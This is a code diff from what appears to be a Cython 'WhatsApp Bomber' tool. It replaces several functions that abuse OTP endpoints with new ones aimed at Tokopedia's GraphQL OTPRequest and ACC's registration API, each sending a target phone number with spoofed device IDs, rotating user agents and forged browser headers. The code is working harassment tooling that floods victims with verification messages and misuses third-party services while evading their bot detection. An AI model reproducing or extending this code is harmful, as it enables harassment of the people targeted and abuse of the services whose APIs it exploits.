@@ -444,80 +444,89 @@ cpdef str get_unique_ua():
     except:
         return "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36"
 
-cpdef tuple send_pinjam_duit(str phone):
+cpdef tuple send_tokopedia(str phone):
     cdef str ua = get_unique_ua()
-    cdef str url = "https://api-prod.pinjamduit.co.id/gw/loan/credit-user/sms-code"
-    cdef str phone_with_0 = "0" + phone
-    cdef str timestamp = str(int(time.time() * 1000))
+    cdef str url = "https://gql.tokopedia.com/graphql/OTPRequest"
+    cdef str phone_with_62 = "62" + phone
     
-    cdef str payload = f"phone={phone_with_0}&sms_useage=10&sms_service=2&mobilePhone=&clientType=a&appVersion=7.1.0&deviceId=039B037C963389AA5F61ED11335A20FE&hardwareid=683a1c3eacbe95cbea77e33cb28cd37aa8a235a521ecd19d9641855ff83a4741&deviceName=V2205&osVersion=14&appName=PinjamDuit&appMarket=google_play"
+    cdef list payload = [{
+        "operationName": "OTPRequest",
+        "variables": {
+            "msisdn": phone_with_62,
+            "MsisdnEnc": "",
+            "EmailEnc": "",
+            "otpType": "116",
+            "mode": "whatsapp",
+            "otpDigit": 6
+        },
+        "query": "query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n    success\n    message\n    errorMessage\n    prefixMisscall\n    message_title\n    message_sub_title\n    message_img_link\n    error_code\n  }\n}\n"
+    }]
     
     cdef dict headers = {
         'User-Agent': ua,
-        'Accept-Encoding': "gzip",
-        'ss': "PvCzXQxBx2dgPGH1UHPONt7eXWgubCk1E6ujEEzOxlCAD5X2gYLKa74O+ay3nMID",
-        'ts': "dXRjG+7WKZ5HVxA2LZihTw==",
-        'timestamp': timestamp,
-        'Content-Type': "application/x-www-form-urlencoded"
-    }
-    try:
-        r = requests.post(url, data=payload, headers=headers, timeout=30)
-        if r.status_code == 200:
-            return (True, "Pinjam Duit")
-        return (False, f"Pinjam Duit: {r.status_code}")
-    except Exception as e:
-        return (False, f"Pinjam Duit: {str(e)[:30]}")
-
-cpdef tuple send_primenotif(str phone):
-    cdef str ua = get_unique_ua()
-    cdef str url = "https://api-prod.pinjamduit.co.id/gw/loan/credit-user/sms-code"
-    cdef str phone_with_0 = "0" + phone
-    cdef str timestamp = str(int(time.time() * 1000))
-    
-    cdef str payload = f"phone={phone_with_0}&sms_useage=11&sms_service=1&mobilePhone=&clientType=a&appVersion=7.1.0&deviceId=039B037C963389AA5F61ED11335A20FE&hardwareid=683a1c3eacbe95cbea77e33cb28cd37aa8a235a521ecd19d9641855ff83a4741&deviceName=V2205&osVersion=14&appName=PinjamDuit&appMarket=google_play"
-    
-    cdef dict headers = {
-        'User-Agent': ua,
-        'Accept-Encoding': "gzip",
-        'ss': "XwaNQaSd2dOljZwp//oRwlxoJzP+zbQD9qKh0t2w2a5X5rCEQlwI5FBh15ODZOqf",
-        'ts': "c10XbhtingUOsyzkhNJfQg==",
-        'timestamp': timestamp,
-        'Content-Type': "application/x-www-form-urlencoded"
-    }
-    try:
-        r = requests.post(url, data=payload, headers=headers, timeout=30)
-        if r.status_code == 200:
-            return (True, "Primenotif")
-        return (False, f"Primenotif: {r.status_code}")
-    except Exception as e:
-        return (False, f"Primenotif: {str(e)[:30]}")
-
-cpdef tuple send_titipku(str phone):
-    cdef str ua = get_unique_ua()
-    cdef str url = "https://titipku.tech/v1/mobile/auth/otp?method=wa"
-    cdef str phone_with_code = "+62" + phone
-    
-    cdef dict payload = {
-        "phone_number": phone_with_code,
-        "message_placeholder": "Titipku: @PIN@. Berlaku selama 5 menit. Jangan berikan info ini kepada siapapun."
-    }
-    
-    cdef dict headers = {
-        'User-Agent': ua,
-        'Connection': "Keep-Alive",
-        'Accept-Encoding': "gzip",
+        'Accept-Encoding': "gzip, deflate, br, zstd",
         'Content-Type': "application/json",
-        'Authorization': "",
-        'device-id': "cd7dbc08842ce277",
-        'App-Type': "nitiper"
+        'sec-ch-ua-platform': '"Android"',
+        'x-version': "1607a8a",
+        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
+        'sec-ch-ua-mobile': "?1",
+        'x-source': "tokopedia-lite",
+        'x-tkpd-akamai': "otp",
+        'x-tkpd-lite-service': "oauth",
+        'origin': "https://www.tokopedia.com",
+        'x-requested-with': "mark.via.gp",
+        'sec-fetch-site': "same-site",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.tokopedia.com/",
+        'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        'priority': "u=1, i"
     }
     try:
         r = requests.post(url, json=payload, headers=headers, timeout=30)
         if r.status_code == 200:
-            return (True, "Titipku")
-        return (False, f"Titipku: {r.status_code}")
+            return (True, "Tokopedia")
+        return (False, f"Tokopedia: {r.status_code}")
     except Exception as e:
-        return (False, f"Titipku: {str(e)[:30]}")
+        return (False, f"Tokopedia: {str(e)[:30]}")
+
+cpdef tuple send_acc(str phone):
+    cdef str ua = get_unique_ua()
+    cdef str url = "https://www.acc.co.id/register/new-account"
+    cdef str phone_with_0 = "0" + phone
+    
+    cdef str payload = json.dumps([{
+        "user_id": None,
+        "action": "register",
+        "send_to": phone_with_0,
+        "provider": "whatsapp"
+    }])
+    
+    cdef dict headers = {
+        'User-Agent': ua,
+        'Accept': "text/x-component",
+        'Accept-Encoding': "gzip, deflate, br, zstd",
+        'Content-Type': "text/plain",
+        'sec-ch-ua-platform': '"Android"',
+        'next-action': "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7",
+        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
+        'sec-ch-ua-mobile': "?1",
+        'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
+        'Origin': "https://www.acc.co.id",
+        'X-Requested-With': "mark.via.gp",
+        'Sec-Fetch-Site': "same-origin",
+        'Sec-Fetch-Mode': "cors",
+        'Sec-Fetch-Dest': "empty",
+        'Referer': "https://www.acc.co.id/register/new-account",
+        'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=30)
+        if r.status_code == 200:
+            return (True, "ACC")
+        return (False, f"ACC: {r.status_code}")
+    except Exception as e:
+        return (False, f"ACC: {str(e)[:30]}")
 
 cpdef tuple send_fazpass(str phone):
     cdef str ua = get_unique_ua()
@@ -586,9 +595,8 @@ cpdef tuple send_pinjam_min(str phone):
         return (False, f"Pinjam Min: {str(e)[:30]}")
 
 WA_SERVICES = [
-    ("Pinjam Duit", send_pinjam_duit),
-    ("Primenotif", send_primenotif),
-    ("Titipku", send_titipku),
+    ("Tokopedia", send_tokopedia),
+    ("ACC", send_acc),
     ("Fazpass", send_fazpass),
     ("Pinjam Min", send_pinjam_min),
 ]
@@ -968,7 +976,7 @@ cpdef void do_login(Auth auth, dict cfg):
             
             user_options = [
                 f"{B}📋 Profile      - Lihat info akun{R}",
-                f"{B}📱 Kirim OTP    - SMS via Dexatel{R}",
+                f"{B}📱 Kirim OTP    - WhatsApp Bomber{R}",
                 f"{B}🚪 Logout       - Keluar akun{R}",
             ]
             user_menu = TerminalMenu(
